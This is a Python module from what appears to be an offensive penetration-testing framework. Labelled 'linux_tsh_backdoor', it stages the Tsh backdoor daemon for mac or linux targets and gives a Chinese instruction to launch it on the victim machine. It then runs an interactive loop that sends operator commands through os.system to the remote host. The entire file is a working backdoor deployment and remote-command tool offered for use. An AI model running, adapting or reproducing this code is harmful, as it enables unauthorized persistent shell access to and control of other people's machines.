#!/usr/bin/env python
# encoding: utf-8
import os
import sys
import shutil
from core.Option import *
from protocol.tcp.TCPClient import TCPClient
platform = sys.platform
if platform == "darwin":
    path = os.getcwd() + '/data/tsh/tsh_mac'
elif platform == "linux":
    path = os.getcwd() + '/data/tsh/tsh_linux'


class Exploit(TCPClient):
    __info__ = {
        "name": "linux_tsh_backdoor",
        "\033[91m内容描述\033[0m": "linux_rsh_backdoor模块叙述：\n"
                               "1.Tsh是一个类似ssh的小后门，具有全pty终端和文件传输功能。该工具占地面积非常小，可以轻松构建在大多数类Unix系统上。\n"
                               "2.客户端执行：% umask 077; HOME=/var/tmp ./tshd 或者 ./tshd \n"
                               "3.更多使用方法请参考以下链接\n",
        "\033[91m参考链接\033[0m": (
            "https://github.com/creaktive/tsh\n"
            "https://artkond.com/2017/03/23/pivoting-guide"
        ),
        "\033[91m作者\033[0m": (
            "Demon",
        ),
    }
    rhost = IPOption("", "远程目标IP地址")
    target = StringOption("", "目标操作系统 填写mac/linux")

    def run(self):
        RHOST = self.rhost
        TARGET = self.target
        ip = " " + RHOST + " "
        if TARGET == "mac":
            file = os.getcwd() + '/data/tsh/tshd_mac'
            shutil.copy(file, os.getcwd())
            print("\033[92m[+]\033[0m  客户端输出路径: " + os.getcwd() + "/tshd_mac \n")
        elif TARGET == "linux":
            file = os.getcwd() + '/data/tsh/tshd_linux'
            shutil.copy(file, os.getcwd())
            print("\033[92m[+]\033[0m  客户端输出路径: " + os.getcwd() + "/tshd_linux \n")
        yes = input("\033[94m[*]\033[0m  如果已经执行客户端请输入yes: ")
        if yes == "yes":
            while True:
                cmd = input("command > ")
                run = path + ip + cmd
                CMD = os.system(run)
                if cmd == 'exit':
                    break
        else:
            print("请在继续在被攻击者机器上执行客户端程序")
